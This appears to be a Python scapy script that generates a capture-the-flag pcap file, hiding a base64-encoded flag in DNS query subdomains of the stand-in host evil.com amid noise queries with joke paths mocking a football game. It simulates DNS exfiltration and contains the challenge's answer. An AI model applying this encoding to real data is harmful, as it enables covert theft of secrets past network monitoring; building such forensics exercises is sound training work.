from scapy.all import IP, UDP, DNS, DNSQR, wrpcap
import base64
import random

# --- Configurable Parameters ---
NUM_NOISE_PACKETS = 200  # Number of random normal DNS queries between secret packets sections
SEPARATOR_PACKETS = 35   # Number of noise packets between each flag chunk packet

# --- Flag Preparation ---
flag = "flag{dns_c4n_l34k_5ecrets}"
encoded = base64.b64encode(flag.encode()).decode()
chunk_size = 12
chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]

# --- Domains and Troll-like Paths ---
legit_base_domains = [
    'google.com', 'github.com', 'kali.org', 'duckduckgo.com', 'stackoverflow.com',
    'amazon.com', 'apple.com', 'python.org', 'wikipedia.org', 'fb.com',
    'bing.com', 'dropbox.com', 'proton.me', 'slack.com', 'microsoft.com',
    'yahoo.com', 'reddit.com'
]

possible_paths = [
    ['search', 'why_is_pes_so_shit'],
    ['docs', 'how_to_use_this'],
    ['help', 'faq'],
    ['blog', 'cybersecurity_tips'],
    ['news', 'latest'],
    ['user', 'settings', 'privacy'],
    ['api', 'v1', 'status'],
    ['products', 'new_arrivals'],
    ['forums', 'general_discussion'],
    ['dev', 'release_notes'],
    # More troll-like paths below
    ['please', 'fix_pes'],
    ['yearly', 'pes_disappointment'],
    ['pes', 'still_bugs'],
    ['no', 'skill_no_win'],
    ['where', 'is_my_goal'],
    ['lag', 'ruins_game'],
    ['stop', 'the_pes_cancer'],
    ['why', 'pes_better_than_fifa'],
    ['pes', 'is_literally_broken'],
    ['waiting', 'for_pes_patch']
]

src_ips = ["10.10.10.%d" % i for i in range(10, 40)]
dst_ip = "8.8.8.8"

pkts = []

def make_realistic_domain():
    base = random.choice(legit_base_domains)
    path = random.choice(possible_paths)
    full_domain = '.'.join(path) + '.' + base
    return full_domain + '.'  # trailing dot for fully qualified domain

# --- Generate Initial Noise ---
for _ in range(NUM_NOISE_PACKETS):
    dom = make_realistic_domain()
    pkt = IP(src=random.choice(src_ips), dst=dst_ip) / \
          UDP(sport=random.randint(1024, 65535), dport=53) / \
          DNS(qd=DNSQR(qname=dom))
    pkts.append(pkt)

# --- Embed Each Flag Chunk, Separated by Noise ---
for idx, chunk in enumerate(chunks):
    # Add separator noise packets
    for _ in range(SEPARATOR_PACKETS):
        dom = make_realistic_domain()
        pkt = IP(src=random.choice(src_ips), dst=dst_ip) / \
              UDP(sport=random.randint(1024, 65535), dport=53) / \
              DNS(qd=DNSQR(qname=dom))
        pkts.append(pkt)

    # Insert secret DNS query with encoded chunk
    secret_domain = f"secret{idx}.{chunk}.evil.com."
    pkt = IP(src="10.10.10.42", dst=dst_ip) / \
          UDP(sport=random.randint(1024, 65535), dport=53) / \
          DNS(qd=DNSQR(qname=secret_domain))
    pkts.append(pkt)

# --- Generate Final Noise ---
for _ in range(NUM_NOISE_PACKETS):
    dom = make_realistic_domain()
    pkt = IP(src=random.choice(src_ips), dst=dst_ip) / \
          UDP(sport=random.randint(1024, 65535), dport=53) / \
          DNS(qd=DNSQR(qname=dom))
    pkts.append(pkt)

# Write to PCAP
wrpcap("dns_leak_big_troll_ctf.pcap", pkts)
print(f"[+] Created 'dns_leak_big_troll_ctf.pcap' with {len(pkts)} packets.")
